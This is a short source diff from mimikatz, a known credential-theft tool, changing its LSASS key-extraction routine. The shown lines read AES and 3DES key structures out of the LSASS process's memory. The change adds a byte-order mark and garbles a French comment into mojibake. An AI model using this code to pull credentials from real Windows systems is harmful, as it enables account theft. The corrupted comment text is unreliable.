@@ -1,4 +1,4 @@
-/*	Benjamin DELPY `gentilkiwi`
+ï»¿/*	Benjamin DELPY `gentilkiwi`
 http://blog.gentilkiwi.com
 benjamin@gentilkiwi.com
 Licence    : http://creativecommons.org/licenses/by/3.0/fr/
@@ -103,7 +103,7 @@ bool mod_mimikatz_sekurlsa_keys_nt6::searchAndInitLSASSData()
 			if(mod_memory::readMemory(mod_mimikatz_sekurlsa::pModLSASRV->modBaseAddr + (reinterpret_cast<PBYTE>(hAesKey) - mod_mimikatz_sekurlsa::localLSASRV.modBaseAddr), &ptrBase, sizeof(PBYTE), mod_mimikatz_sekurlsa::hLSASS))
 				if(mod_memory::readMemory(ptrBase, &maCle, sizeof(KIWI_BCRYPT_KEY), mod_mimikatz_sekurlsa::hLSASS))
 					if(mod_memory::readMemory(maCle.cle, &maCleData, sizeof(KIWI_BCRYPT_KEY_DATA), mod_mimikatz_sekurlsa::hLSASS))
-						if(mod_memory::readMemory(reinterpret_cast<PBYTE>(maCle.cle) + FIELD_OFFSET(KIWI_BCRYPT_KEY_DATA, data), &(*hAesKey)->cle->data, maCleData.size - FIELD_OFFSET(KIWI_BCRYPT_KEY_DATA, data) - 2*sizeof(PVOID), mod_mimikatz_sekurlsa::hLSASS)) // 2 pointeurs internes à la fin, la structure de départ n'était pas inutile ;)
+						if(mod_memory::readMemory(reinterpret_cast<PBYTE>(maCle.cle) + FIELD_OFFSET(KIWI_BCRYPT_KEY_DATA, data), &(*hAesKey)->cle->data, maCleData.size - FIELD_OFFSET(KIWI_BCRYPT_KEY_DATA, data) - 2*sizeof(PVOID), mod_mimikatz_sekurlsa::hLSASS)) // 2 pointeurs internes ?la fin, la structure de dé–œart n'é– ait pas inutile ;)
 							mesSucces++;
 
 			if(mod_memory::readMemory(mod_mimikatz_sekurlsa::pModLSASRV->modBaseAddr + (reinterpret_cast<PBYTE>(h3DesKey) - mod_mimikatz_sekurlsa::localLSASRV.modBaseAddr), &ptrBase, sizeof(PBYTE), mod_mimikatz_sekurlsa::hLSASS))
